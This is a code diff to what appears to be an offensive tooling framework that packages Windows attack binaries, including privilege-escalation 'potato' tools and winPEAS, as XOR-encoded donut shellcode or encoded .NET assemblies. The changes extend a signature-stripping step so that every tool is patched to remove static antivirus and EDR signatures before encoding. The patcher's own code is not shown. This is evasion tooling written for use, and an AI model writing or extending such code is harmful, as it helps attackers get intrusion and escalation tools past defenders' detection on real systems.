@@ -8,24 +8,15 @@ from core.encoding import pack_enc, find_donut as _find_donut
 
 _HERE     = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 _WIN_BINS = os.path.join(_HERE, "windows")
-_POT_BINS = os.path.join(_HERE, "potatoes")
-_LEGACY   = os.path.join(_HERE, "windows-binaries")
 _RP_BINS  = os.path.join(_HERE, "RoguePlanet")
 
 
 def _win(*name):
-    return [
-        os.path.join(_WIN_BINS, *name),
-        os.path.join(_LEGACY,   *name),
-    ]
+    return [os.path.join(_WIN_BINS, *name)]
 
 
 def _pot(*name):
-    """Privilege-escalation binaries — checked in potatoes/ then windows-binaries/."""
-    return [
-        os.path.join(_POT_BINS, *name),
-        os.path.join(_LEGACY,   *name),
-    ]
+    return [os.path.join(_WIN_BINS, *name)]
 
 
 def resolve_params(params: str | None, lhost: str) -> str | None:
@@ -255,14 +246,14 @@ def encode_tool_clr(binary_path: str, output_path: str) -> bool:
         print(f"[!] Cannot read {binary_path}: {e}")
         return False
 
-    # Auto-patch winPEAS-family binaries before encoding
+    # Strip static AV/EDR signatures from ALL tools before encoding
     try:
-        from builders.winpeas_patcher import patch_winpeas
-        if b"BSJB" in raw and (b"winPEAS" in raw or b"winpeas" in raw):
-            print(f"[*] winPEAS detected — stripping static signatures before encode...")
-            raw = patch_winpeas(raw)
+        from builders.pe_patcher import patch_pe
+        toolname = os.path.splitext(os.path.basename(binary_path))[0]
+        print(f"[*] Stripping signatures: {toolname}")
+        raw = patch_pe(raw, toolname=toolname)
     except Exception as e:
-        print(f"[!] winPEAS patcher error (continuing without patch): {e}")
+        print(f"[!] pe_patcher error (continuing without patch): {e}")
 
     encoded = pack_enc(raw)
     with open(output_path, "wb") as f:
@@ -296,6 +287,23 @@ def encode_tool(binary_path: str, params: str | None, output_path: str) -> bool:
     Native EXEs: donut shellcode → XOR encoded."""
     if is_dotnet_assembly(binary_path):
         return encode_tool_clr(binary_path, output_path)
+
+    # Strip signatures from native PE before shellcode conversion
+    try:
+        from builders.pe_patcher import patch_pe
+        toolname = os.path.splitext(os.path.basename(binary_path))[0]
+        print(f"[*] Stripping signatures: {toolname}")
+        with open(binary_path, "rb") as _f:
+            _raw = _f.read()
+        _patched = patch_pe(_raw, toolname=toolname)
+        # Write patched binary to a temp file for donut
+        import tempfile as _tf
+        _tmp_dir = _tf.mkdtemp(prefix="lt_patch_")
+        binary_path = os.path.join(_tmp_dir, os.path.basename(binary_path))
+        with open(binary_path, "wb") as _f:
+            _f.write(_patched)
+    except Exception as e:
+        print(f"[!] pe_patcher error (continuing without patch): {e}")
 
     shellcode: bytes | None = None
 
